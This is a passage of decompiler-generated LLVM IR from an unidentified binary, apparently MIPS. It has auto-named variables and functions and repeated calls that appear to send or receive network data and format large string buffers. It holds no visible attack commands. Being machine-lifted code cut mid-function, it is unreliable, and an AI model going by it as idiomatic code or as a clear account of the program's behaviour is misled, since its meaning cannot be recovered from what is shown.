  store i32 %v2_40341c, i32* %a0.global-to-local, align 4
  %v3_40354c = call i32 @function_403e84()
  store i32 %v3_40354c, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v0_403558 = load i32, i32* %s1.global-to-local, align 4
  store i32 %v0_403558, i32* %a0.global-to-local, align 4
  %v3_40355c = load i32, i32* @global_var_449bd0.106, align 4
  store i32 %v3_40355c, i32* @t9, align 4
  %v7_403568 = call i32 @function_405e70(i32 %v0_403558, i32* nonnull %stack_var_-1092, i32 %v3_40354c, i32 16384, i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_403568, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v3_403578 = load i32, i32* @global_var_4499d0.88, align 4
  store i32 %v3_403578, i32* %v1.global-to-local, align 4
  %v1_40357c = icmp slt i32 %v7_403568, 1
  br i1 %v1_40357c, label %dec_label_pc_403aac, label %dec_label_pc_403580

dec_label_pc_403580:                              ; preds = %dec_label_pc_403504
  %v0_403584 = load i32, i32* @s2, align 4
  %v1_403584 = add i32 %v0_403584, 1042
  %v2_403584 = inttoptr i32 %v1_403584 to i8*
  %v3_403584 = load i8, i8* %v2_403584, align 1
  %v4_403584 = zext i8 %v3_403584 to i32
  %v1_40358c = add nuw nsw i32 %v4_403584, 1
  store i32 %v1_40358c, i32* %v0.global-to-local, align 4
  %v1_40359c = trunc i32 %v1_40358c to i8
  store i8 %v1_40359c, i8* %v2_403584, align 1
  store i32 1024, i32* @a2, align 4
  store i32 %v2_40341c, i32* @a0, align 4
  %v6_4035b0 = call i32 @function_403f6c(i32 %v2_40341c, i32 0, i32 1024)
  store i32 %v6_4035b0, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  store i32 %v2_40341c, i32* %a0.global-to-local, align 4
  %v3_4035c4 = load i32, i32* @global_var_449ac8.59, align 4
  store i32 %v3_4035c4, i32* @t9, align 4
  %v8_4035cc = call i32 @function_403f08(i8* %v7_403444, i32 ptrtoint ([27 x i8]* @global_var_408768.155 to i32))
  store i32 %v8_4035cc, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v0_4035d8 = load i32, i32* @s2, align 4
  %v1_4035d8 = add i32 %v0_4035d8, 1044
  %v2_4035d8 = inttoptr i32 %v1_4035d8 to i32*
  %v3_4035d8 = load i32, i32* %v2_4035d8, align 4
  store i32 %v3_4035d8, i32* %v0.global-to-local, align 4
  %v1_4035e0 = inttoptr i32 %v3_4035d8 to i32*
  %v2_4035e0 = load i32, i32* %v1_4035e0, align 4
  store i32 %v2_4035e0, i32* @a1, align 4
  store i32 %v2_40341c, i32* %a0.global-to-local, align 4
  %v6_4035e4 = call i32 @function_403ea8(i8* %v7_403444, i32 %v2_4035e0)
  store i32 %v6_4035e4, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  store i32 %v2_40341c, i32* %a0.global-to-local, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_4086f0.152 to i32), i32* @a1, align 4
  %v8_403600 = call i32 @function_403ea8(i8* %v7_403444, i32 ptrtoint ([11 x i8]* @global_var_4086f0.152 to i32))
  store i32 %v8_403600, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v0_40360c = load i32, i32* @s2, align 4
  %v1_40360c = add i32 %v0_40360c, 1044
  %v2_40360c = inttoptr i32 %v1_40360c to i32*
  %v3_40360c = load i32, i32* %v2_40360c, align 4
  store i32 %v3_40360c, i32* %v0.global-to-local, align 4
  %v1_403614 = add i32 %v3_40360c, 4
  %v2_403614 = inttoptr i32 %v1_403614 to i32*
  %v3_403614 = load i32, i32* %v2_403614, align 4
  store i32 %v3_403614, i32* @a1, align 4
  store i32 %v2_40341c, i32* %a0.global-to-local, align 4
  %v6_403618 = call i32 @function_403ea8(i8* %v7_403444, i32 %v3_403614)
  store i32 %v6_403618, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  store i32 %v2_40341c, i32* %a0.global-to-local, align 4
  store i32 ptrtoint ([14 x i8]* @global_var_408784.156 to i32), i32* @a1, align 4
  %v8_403634 = call i32 @function_403ea8(i8* %v7_403444, i32 ptrtoint ([14 x i8]* @global_var_408784.156 to i32))
  store i32 %v8_403634, i32* @v0, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v0_403648 = load i32, i32* @s2, align 4
  %v1_403648 = add i32 %v0_403648, 8
  %v2_403648 = inttoptr i32 %v1_403648 to i32*
  %v3_403648 = load i32, i32* %v2_403648, align 4
  store i32 %v3_403648, i32* %s1.global-to-local, align 4
  store i32 %v2_40341c, i32* %a0.global-to-local, align 4
  %v3_40364c = call i32 @function_403e84()
  store i32 %v3_40364c, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v0_403658 = load i32, i32* %s1.global-to-local, align 4
  store i32 %v0_403658, i32* %a0.global-to-local, align 4
  %v3_40365c = load i32, i32* @global_var_449bd0.106, align 4
  store i32 %v3_40365c, i32* @t9, align 4
  %v7_403668 = call i32 @function_405e70(i32 %v0_403658, i32* nonnull %stack_var_-1092, i32 %v3_40364c, i32 16384, i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_403668, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v1_403674 = icmp slt i32 %v7_403668, 1
  %v2_403674 = load i32, i32* @s2, align 4
  store i32 %v2_403674, i32* %a0.global-to-local, align 4
  br i1 %v1_403674, label %dec_label_pc_403ba8, label %dec_label_pc_403678

dec_label_pc_403678:                              ; preds = %dec_label_pc_403580
  %v3_40367c = load i32, i32* bitcast (i32** @global_var_449a8c.158 to i32*), align 4
  store i32 %v3_40367c, i32* %v0.global-to-local, align 4
  %v1_403680 = add i32 %v2_403674, 1042
  %v2_403680 = inttoptr i32 %v1_403680 to i8*
  %v3_403680 = load i8, i8* %v2_403680, align 1
  %v4_403680 = zext i8 %v3_403680 to i32
  %v1_403688 = add nuw nsw i32 %v4_403680, 1
  store i32 %v1_403688, i32* %v1.global-to-local, align 4
  %v2_403690 = icmp eq i32 %v1_403688, ptrtoint (i32* @global_var_449a8d.159 to i32)
  store i32 3, i32* %v0.global-to-local, align 4
  br i1 %v2_403690, label %dec_label_pc_403bbc, label %dec_label_pc_403694

dec_label_pc_403694:                              ; preds = %dec_label_pc_403678
  %v1_403698 = add i32 %v2_403674, 17
  %v2_403698 = inttoptr i32 %v1_403698 to i8*
  %v3_403698 = load i8, i8* %v2_403698, align 1
  %v4_403698 = zext i8 %v3_403698 to i32
  store i32 %v4_403698, i32* %v1.global-to-local, align 4
  %v2_4036a0 = icmp eq i8 %v3_403698, 3
  br i1 %v2_4036a0, label %dec_label_pc_4036a4, label %dec_label_pc_403bec

dec_label_pc_4036a4:                              ; preds = %dec_label_pc_403694
  store i32 %v2_40341c, i32* %s1.global-to-local, align 4
  store i32 %v2_40341c, i32* @a0, align 4
  store i32 1024, i32* @a2, align 4
  %v4_4036c0 = call i32 @function_403f6c(i32 %v2_40341c, i32 0, i32 1024)
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v3_4036d8 = load i32, i32* @global_var_449adc.138, align 4
  store i32 %v3_4036d8, i32* @t9, align 4
  store i32 88, i32* %v0.global-to-local, align 4
  store i32 %v2_40341c, i32* %a0.global-to-local, align 4
  %v5_4036f0 = call i32 @function_404acc(i32 %v2_40341c, i32 ptrtoint ([860 x i8]* @global_var_408794.160 to i32), i32 185)
  store i32 %v5_4036f0, i32* %v0.global-to-local, align 4
  %v0_403700 = load i32, i32* @s2, align 4
  %v1_403700 = add i32 %v0_403700, 17
  %v2_403700 = inttoptr i32 %v1_403700 to i8*
  %v3_403700 = load i8, i8* %v2_403700, align 1
  %v4_403700 = zext i8 %v3_403700 to i32
  store i32 %v4_403700, i32* %v1.global-to-local, align 4
  %v2_403708 = icmp eq i8 %v3_403700, 2
  store i32 3, i32* @v0, align 4
  br i1 %v2_403708, label %dec_label_pc_40371c.thread, label %dec_label_pc_40371c

dec_label_pc_40371c.thread:                       ; preds = %dec_label_pc_4036a4
  store i32 %v0_403700, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_40372c

dec_label_pc_40371c:                              ; preds = %dec_label_pc_4036a4
  %v2_40371c = icmp eq i8 %v3_403700, 3
  store i32 %v0_403700, i32* %a0.global-to-local, align 4
  br i1 %v2_40371c, label %dec_label_pc_403720, label %dec_label_pc_40372c

dec_label_pc_403720:                              ; preds = %dec_label_pc_40371c
  br label %dec_label_pc_40372c

dec_label_pc_40372c:                              ; preds = %dec_label_pc_40371c.thread, %dec_label_pc_40371c, %dec_label_pc_403720
  store i32 %stack_var_-52.3, i32* %a0.global-to-local, align 4
  %v1_403734 = add i32 %v0_403700, 8
  %v2_403734 = inttoptr i32 %v1_403734 to i32*
  %v3_403734 = load i32, i32* %v2_403734, align 4
  store i32 %v3_403734, i32* @s0, align 4
  %v1_403738 = call i32 @function_403e84()
  store i32 %v1_403738, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v3_403748 = load i32, i32* @global_var_449bd0.106, align 4
  store i32 %v3_403748, i32* @t9, align 4
  %v0_40374c = load i32, i32* @s0, align 4
  store i32 %v0_40374c, i32* %a0.global-to-local, align 4
  %v6_403754 = inttoptr i32 %stack_var_-52.3 to i32*
  %v7_403754 = call i32 @function_405e70(i32 %v0_40374c, i32* %v6_403754, i32 %v1_403738, i32 16384, i32 ptrtoint (i32* @0 to i32))
  %v1_40375c = icmp slt i32 %v7_403754, 2
  %v2_40375c = zext i1 %v1_40375c to i32
  store i32 %v2_40375c, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v1_403764 = icmp eq i1 %v1_40375c, false
  %v2_403764 = load i32, i32* @s2, align 4
  store i32 %v2_403764, i32* %a0.global-to-local, align 4
  br i1 %v1_403764, label %dec_label_pc_403ba8, label %dec_label_pc_403768

dec_label_pc_403768:                              ; preds = %dec_label_pc_40372c
  %v3_403770 = load i32, i32* @global_var_449bd0.106, align 4
  store i32 %v3_403770, i32* @t9, align 4
  %v1_403774 = add i32 %v2_403764, 8
  %v2_403774 = inttoptr i32 %v1_403774 to i32*
  %v3_403774 = load i32, i32* %v2_403774, align 4
  store i32 %v3_403774, i32* %a0.global-to-local, align 4
  %v8_403780 = call i32 @function_405e70(i32 %v3_403774, i32* bitcast ([3 x i8]* @global_var_408af0.161 to i32*), i32 2, i32 16384, i32 ptrtoint (i32* @0 to i32))
  store i32 %v8_403780, i32* @v0, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v1_40378c = icmp slt i32 %v8_403780, 1
  br i1 %v1_40378c, label %dec_label_pc_403ba4, label %dec_label_pc_403790

dec_label_pc_403790:                              ; preds = %dec_label_pc_403768
  %v0_403794 = load i32, i32* @s2, align 4
  %v3_4037a4 = load i32, i32* @global_var_4499d0.88, align 4
  %v1_4037ac = add i32 %v3_4037a4, 9656
  store i32 %v0_403794, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_4037ac)
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v0_4037c4 = load i32, i32* @s2, align 4
  store i32 %v0_4037c4, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_4037d0

dec_label_pc_4037d0:                              ; preds = %dec_label_pc_403248.dec_label_pc_4037d0_crit_edge, %dec_label_pc_403790
  %v2_4037e0.pre-phi = phi i32 [ %.pre, %dec_label_pc_403248.dec_label_pc_4037d0_crit_edge ], [ %v2_40341c, %dec_label_pc_403790 ]
  %v0_4037e4 = phi i32 [ %v0_4037d0.pre, %dec_label_pc_403248.dec_label_pc_4037d0_crit_edge ], [ %v0_4037c4, %dec_label_pc_403790 ]
  store i32 %v0_4037e4, i32* %a0.global-to-local, align 4
  store i32 %v2_4037e0.pre-phi, i32* %s1.global-to-local, align 4
  %v1_4037e4 = add i32 %v0_4037e4, 8
  %v2_4037e4 = inttoptr i32 %v1_4037e4 to i32*
  %v3_4037e4 = load i32, i32* %v2_4037e4, align 4
  store i32 %v3_4037e4, i32* @s0, align 4
  store i32 %v2_4037e0.pre-phi, i32* %a0.global-to-local, align 4
  %v3_4037e8 = call i32 @function_403e84()
  store i32 %v3_4037e8, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v0_4037f4 = load i32, i32* @s0, align 4
  store i32 %v0_4037f4, i32* %a0.global-to-local, align 4
  %v3_4037f8 = load i32, i32* @global_var_449bd0.106, align 4
  store i32 %v3_4037f8, i32* @t9, align 4
  %v7_403804 = call i32 @function_405e70(i32 %v0_4037f4, i32* nonnull %stack_var_-1092, i32 %v3_4037e8, i32 16384, i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_403804, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v1_403810 = icmp slt i32 %v7_403804, 1
  br i1 %v1_403810, label %dec_label_pc_403ba4, label %dec_label_pc_403814

dec_label_pc_403814:                              ; preds = %dec_label_pc_4037d0
  %v3_40381c = load i32, i32* @global_var_449bd0.106, align 4
  store i32 %v3_40381c, i32* @t9, align 4
  %v0_403820 = load i32, i32* @s2, align 4
  %v1_403820 = add i32 %v0_403820, 8
  %v2_403820 = inttoptr i32 %v1_403820 to i32*
  %v3_403820 = load i32, i32* %v2_403820, align 4
  store i32 %v3_403820, i32* %a0.global-to-local, align 4
  %v8_403828 = call i32 @function_405e70(i32 %v3_403820, i32* bitcast ([3 x i8]* @global_var_408af0.161 to i32*), i32 2, i32 16384, i32 ptrtoint (i32* @0 to i32))
  store i32 %v8_403828, i32* @v0, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v3_403838 = load i32, i32* @global_var_4499d0.88, align 4
  store i32 %v3_403838, i32* %v1.global-to-local, align 4
  %v1_40383c = icmp slt i32 %v8_403828, 0
  br i1 %v1_40383c, label %dec_label_pc_403aac, label %dec_label_pc_403840

dec_label_pc_403840:                              ; preds = %dec_label_pc_403814
  store i32 %stack_var_-56.3, i32* %a0.global-to-local, align 4
  %v0_403854 = load i32, i32* @s2, align 4
  %v1_403854 = add i32 %v0_403854, 8
  %v2_403854 = inttoptr i32 %v1_403854 to i32*
  %v3_403854 = load i32, i32* %v2_403854, align 4
  store i32 %v3_403854, i32* @s0, align 4
  %v1_403858 = call i32 @function_403e84()
  store i32 %v1_403858, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v3_403868 = load i32, i32* @global_var_449bd0.106, align 4
  store i32 %v3_403868, i32* @t9, align 4
  %v0_40386c = load i32, i32* @s0, align 4
  store i32 %v0_40386c, i32* %a0.global-to-local, align 4
  %v6_403874 = inttoptr i32 %stack_var_-56.3 to i32*
  %v7_403874 = call i32 @function_405e70(i32 %v0_40386c, i32* %v6_403874, i32 %v1_403858, i32 16384, i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_403874, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v1_403880 = icmp slt i32 %v7_403874, 0
  br i1 %v1_403880, label %dec_label_pc_403ba4, label %dec_label_pc_403884

dec_label_pc_403884:                              ; preds = %dec_label_pc_403840
  %v3_40388c = load i32, i32* @global_var_449bd0.106, align 4
  store i32 %v3_40388c, i32* @t9, align 4
  %v0_403890 = load i32, i32* @s2, align 4
  %v1_403890 = add i32 %v0_403890, 8
  %v2_403890 = inttoptr i32 %v1_403890 to i32*
  %v3_403890 = load i32, i32* %v2_403890, align 4
  store i32 %v3_403890, i32* %a0.global-to-local, align 4
  %v8_403898 = call i32 @function_405e70(i32 %v3_403890, i32* bitcast ([3 x i8]* @global_var_408af0.161 to i32*), i32 2, i32 16384, i32 ptrtoint (i32* @0 to i32))
  store i32 %v8_403898, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v3_4038a8 = load i32, i32* @global_var_4499d0.88, align 4
  store i32 %v3_4038a8, i32* %v1.global-to-local, align 4
  %v0_4038b4 = load i32, i32* @s2, align 4
  %v1_4038b4 = add i32 %v0_4038b4, 17
  %v2_4038b4 = inttoptr i32 %v1_4038b4 to i8*
  %v3_4038b4 = load i8, i8* %v2_4038b4, align 1
  %v4_4038b4 = zext i8 %v3_4038b4 to i32
  store i32 %v4_4038b4, i32* %v1.global-to-local, align 4
  %v2_4038bc = icmp eq i8 %v3_4038b4, 2
  store i32 3, i32* %v0.global-to-local, align 4
  br i1 %v2_4038bc, label %dec_label_pc_4038d0.thread, label %dec_label_pc_4038d0

dec_label_pc_4038d0.thread:                       ; preds = %dec_label_pc_403884
  store i32 %v0_4038b4, i32* %a0.global-to-local, align 4
  store i32 %v2_4037e0.pre-phi, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_4038e4

dec_label_pc_4038d0:                              ; preds = %dec_label_pc_403884
  %v2_4038d0 = icmp eq i8 %v3_4038b4, 3
  store i32 %v2_4037e0.pre-phi, i32* %s1.global-to-local, align 4
  br i1 %v2_4038d0, label %dec_label_pc_4038d4, label %dec_label_pc_4038e4

dec_label_pc_4038d4:                              ; preds = %dec_label_pc_4038d0
  store i32 %v0_4038b4, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_4038e4

dec_label_pc_4038e4:                              ; preds = %dec_label_pc_4038d0.thread, %dec_label_pc_4038d0, %dec_label_pc_4038d4
  store i32 1024, i32* @a2, align 4
  store i32 %v2_4037e0.pre-phi, i32* @a0, align 4
  %v6_4038f0 = call i32 @function_403f6c(i32 %v2_4037e0.pre-phi, i32 0, i32 1024)
  store i32 %v6_4038f0, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v3_403900 = load i32, i32* @global_var_449b08.52, align 4
  store i32 %v3_403900, i32* @t9, align 4
  store i32 22, i32* %a0.global-to-local, align 4
  %v2_403908 = call i32 @function_4002d0(i32 22)
  store i32 %v2_403908, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v3_403918 = load i32, i32* @global_var_449c30.53, align 4
  store i32 %v3_403918, i32* @t9, align 4
  store i32 22, i32* %a0.global-to-local, align 4
  %v2_403920 = call i32 @function_400564(i32 22)
  store i32 %v2_403920, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  store i32 22, i32* %a0.global-to-local, align 4
  %v3_403930 = load i32, i32* @global_var_449c30.53, align 4
  store i32 %v3_403930, i32* @t9, align 4
  store i32 %v2_403920, i32* %s0.global-to-local, align 4
  %v3_403938 = call i32 @function_400564(i32 22)
  store i32 %v3_403938, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v0_403944 = load i32, i32* %s0.global-to-local, align 4
  %v3_40394c = load i32, i32* @global_var_449adc.138, align 4
  store i32 %v3_40394c, i32* @t9, align 4
  store i32 %v2_4037e0.pre-phi, i32* %a0.global-to-local, align 4
  %v7_403958 = call i32 @function_404acc(i32 %v2_4037e0.pre-phi, i32 ptrtoint ([852 x i8]* @global_var_408b04.163 to i32), i32 %v0_403944)
  store i32 %v7_403958, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v3_403968 = load i32, i32* @global_var_449bb8.61, align 4
  store i32 %v3_403968, i32* @t9, align 4
  store i32 22, i32* %a0.global-to-local, align 4
  %v2_403970 = call i32 @function_400418(i32 22)
  store i32 %v2_403970, i32* @v0, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v0_403984 = load i32, i32* @s2, align 4
  %v1_403984 = add i32 %v0_403984, 8
  %v2_403984 = inttoptr i32 %v1_403984 to i32*
  %v3_403984 = load i32, i32* %v2_403984, align 4
  store i32 %v3_403984, i32* @s0, align 4
  store i32 %v2_4037e0.pre-phi, i32* %a0.global-to-local, align 4
  %v3_403988 = call i32 @function_403e84()
  store i32 %v3_403988, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v0_403994 = load i32, i32* @s0, align 4
  store i32 %v0_403994, i32* %a0.global-to-local, align 4
  %v3_403998 = load i32, i32* @global_var_449bd0.106, align 4
  store i32 %v3_403998, i32* @t9, align 4
  %v7_4039a4 = call i32 @function_405e70(i32 %v0_403994, i32* nonnull %stack_var_-1092, i32 %v3_403988, i32 16384, i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_4039a4, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v3_4039b4 = load i32, i32* @global_var_4499d0.88, align 4
  store i32 %v3_4039b4, i32* %v1.global-to-local, align 4
  %v1_4039b8 = icmp slt i32 %v7_4039a4, 1
  br i1 %v1_4039b8, label %dec_label_pc_403aac, label %dec_label_pc_4039bc

dec_label_pc_4039bc:                              ; preds = %dec_label_pc_4038e4
  store i32 %v2_4037e0.pre-phi, i32* %s1.global-to-local, align 4
  store i32 1024, i32* @a2, align 4
  store i32 %v2_4037e0.pre-phi, i32* @a0, align 4
  %v6_4039e0 = call i32 @function_403f6c(i32 %v2_4037e0.pre-phi, i32 0, i32 1024)
  store i32 %v6_4039e0, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v3_4039f0 = load i32, i32* @global_var_449b08.52, align 4
  store i32 %v3_4039f0, i32* @t9, align 4
  store i32 22, i32* %a0.global-to-local, align 4
  %v2_4039f8 = call i32 @function_4002d0(i32 22)
  store i32 %v2_4039f8, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v3_403a08 = load i32, i32* @global_var_449c30.53, align 4
  store i32 %v3_403a08, i32* @t9, align 4
  store i32 22, i32* %a0.global-to-local, align 4
  %v2_403a10 = call i32 @function_400564(i32 22)
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v3_403a28 = load i32, i32* @global_var_449adc.138, align 4
  store i32 %v3_403a28, i32* @t9, align 4
  store i32 88, i32* %v0.global-to-local, align 4
  store i32 %v2_4037e0.pre-phi, i32* %a0.global-to-local, align 4
  %v7_403a44 = call i32 @function_404acc(i32 %v2_4037e0.pre-phi, i32 ptrtoint ([880 x i8]* @global_var_408e58.164 to i32), i32 185)
  store i32 %v7_403a44, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v3_403a54 = load i32, i32* @global_var_449bb8.61, align 4
  store i32 %v3_403a54, i32* @t9, align 4
  store i32 22, i32* %a0.global-to-local, align 4
  %v2_403a5c = call i32 @function_400418(i32 22)
  store i32 %v2_403a5c, i32* @v0, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v0_403a70 = load i32, i32* @s2, align 4
  %v1_403a70 = add i32 %v0_403a70, 8
  %v2_403a70 = inttoptr i32 %v1_403a70 to i32*
  %v3_403a70 = load i32, i32* %v2_403a70, align 4
  store i32 %v3_403a70, i32* @s0, align 4
  store i32 %v2_4037e0.pre-phi, i32* %a0.global-to-local, align 4
  %v3_403a74 = call i32 @function_403e84()
  store i32 %v3_403a74, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v0_403a80 = load i32, i32* @s0, align 4
  store i32 %v0_403a80, i32* %a0.global-to-local, align 4
  %v3_403a84 = load i32, i32* @global_var_449bd0.106, align 4
  store i32 %v3_403a84, i32* @t9, align 4
  %v7_403a90 = call i32 @function_405e70(i32 %v0_403a80, i32* nonnull %stack_var_-1092, i32 %v3_403a74, i32 16384, i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_403a90, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v3_403aa0 = load i32, i32* @global_var_4499d0.88, align 4
  store i32 %v3_403aa0, i32* %v1.global-to-local, align 4
  %v1_403aa4 = icmp sgt i32 %v7_403a90, 0
  br i1 %v1_403aa4, label %dec_label_pc_4039bc.dec_label_pc_403abc_crit_edge, label %dec_label_pc_403aac

dec_label_pc_4039bc.dec_label_pc_403abc_crit_edge: ; preds = %dec_label_pc_4039bc
  %v0_403ac0.pre = load i32, i32* @s2, align 4
  br label %dec_label_pc_403abc

dec_label_pc_403aac:                              ; preds = %dec_label_pc_4033cc.dec_label_pc_403aac_crit_edge, %dec_label_pc_4039bc, %dec_label_pc_4038e4, %dec_label_pc_403814, %dec_label_pc_403504
  %.pre59.pre-phi = phi i32 [ %.pre60, %dec_label_pc_4033cc.dec_label_pc_403aac_crit_edge ], [ %v2_4037e0.pre-phi, %dec_label_pc_4039bc ], [ %v2_4037e0.pre-phi, %dec_label_pc_4038e4 ], [ %v2_4037e0.pre-phi, %dec_label_pc_403814 ], [ %v2_40341c, %dec_label_pc_403504 ]
  %v0_403ab0 = load i32, i32* @s2, align 4
  store i32 %v0_403ab0, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_403abc

dec_label_pc_403abc:                              ; preds = %dec_label_pc_4039bc.dec_label_pc_403abc_crit_edge, %dec_label_pc_403aac
  %v2_403ad0.pre-phi = phi i32 [ %v2_4037e0.pre-phi, %dec_label_pc_4039bc.dec_label_pc_403abc_crit_edge ], [ %.pre59.pre-phi, %dec_label_pc_403aac ]
  %v0_403ac0 = phi i32 [ %v0_403ac0.pre, %dec_label_pc_4039bc.dec_label_pc_403abc_crit_edge ], [ %v0_403ab0, %dec_label_pc_403aac ]
  store i32 %v0_403ac0, i32* %a0.global-to-local, align 4
  %v1_403acc = add i32 %v1_402868, 291784
  %v2_403acc = inttoptr i32 %v1_403acc to i32*
  %v3_403acc = load i32, i32* %v2_403acc, align 4
  store i32 %v2_403ad0.pre-phi, i32* %s1.global-to-local, align 4
  store i32 %v2_403ad0.pre-phi, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_403acc)
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v3_403aec = load i32, i32* @global_var_449b08.52, align 4
  store i32 %v3_403aec, i32* @t9, align 4
  store i32 22, i32* %a0.global-to-local, align 4
  %v2_403af4 = call i32 @function_4002d0(i32 22)
  store i32 %v2_403af4, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v3_403b04 = load i32, i32* @global_var_449c30.53, align 4
  store i32 %v3_403b04, i32* @t9, align 4
  store i32 22, i32* %a0.global-to-local, align 4
  %v2_403b0c = call i32 @function_400564(i32 22)
  store i32 %v2_403b0c, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  store i32 22, i32* %a0.global-to-local, align 4
  %v3_403b1c = load i32, i32* @global_var_449c30.53, align 4
  store i32 %v3_403b1c, i32* @t9, align 4
  store i32 %v2_403b0c, i32* %s0.global-to-local, align 4
  %v3_403b24 = call i32 @function_400564(i32 22)
  store i32 %v3_403b24, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  store i32 %v2_403ad0.pre-phi, i32* %a0.global-to-local, align 4
  %v3_403b38 = load i32, i32* @global_var_449adc.138, align 4
  store i32 %v3_403b38, i32* @t9, align 4
  %v1_403b44 = load i32, i32* %s0.global-to-local, align 4
  %v6_403b44 = call i32 @function_404acc(i32 %v2_403ad0.pre-phi, i32 ptrtoint ([852 x i8]* @global_var_4091c8.165 to i32), i32 %v1_403b44)
  store i32 %v6_403b44, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v3_403b54 = load i32, i32* @global_var_449bb8.61, align 4
  store i32 %v3_403b54, i32* @t9, align 4
  store i32 22, i32* %a0.global-to-local, align 4
  %v2_403b5c = call i32 @function_400418(i32 22)
  store i32 %v2_403b5c, i32* @v0, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v0_403b70 = load i32, i32* @s2, align 4
  %v1_403b70 = add i32 %v0_403b70, 8
  %v2_403b70 = inttoptr i32 %v1_403b70 to i32*
  %v3_403b70 = load i32, i32* %v2_403b70, align 4
  store i32 %v3_403b70, i32* @s0, align 4
  store i32 %v2_403ad0.pre-phi, i32* %a0.global-to-local, align 4
  %v3_403b74 = call i32 @function_403e84()
  store i32 %v3_403b74, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v0_403b80 = load i32, i32* @s0, align 4
  store i32 %v0_403b80, i32* %a0.global-to-local, align 4
  %v3_403b84 = load i32, i32* @global_var_449bd0.106, align 4
  store i32 %v3_403b84, i32* @t9, align 4
  %v7_403b90 = call i32 @function_405e70(i32 %v0_403b80, i32* nonnull %stack_var_-1092, i32 %v3_403b74, i32 16384, i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_403b90, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v1_403b9c = icmp sgt i32 %v7_403b90, 0
  br i1 %v1_403b9c, label %dec_label_pc_403abc.dec_label_pc_403bb8_crit_edge, label %dec_label_pc_403ba4

dec_label_pc_403abc.dec_label_pc_403bb8_crit_edge: ; preds = %dec_label_pc_403abc
  %v0_403bb8.pre = load i32, i32* @s2, align 4
  br label %dec_label_pc_403bb8

dec_label_pc_403ba4:                              ; preds = %dec_label_pc_403abc, %dec_label_pc_4030fc, %dec_label_pc_403054, %dec_label_pc_403840, %dec_label_pc_4037d0, %dec_label_pc_403768, %dec_label_pc_403228, %dec_label_pc_403180
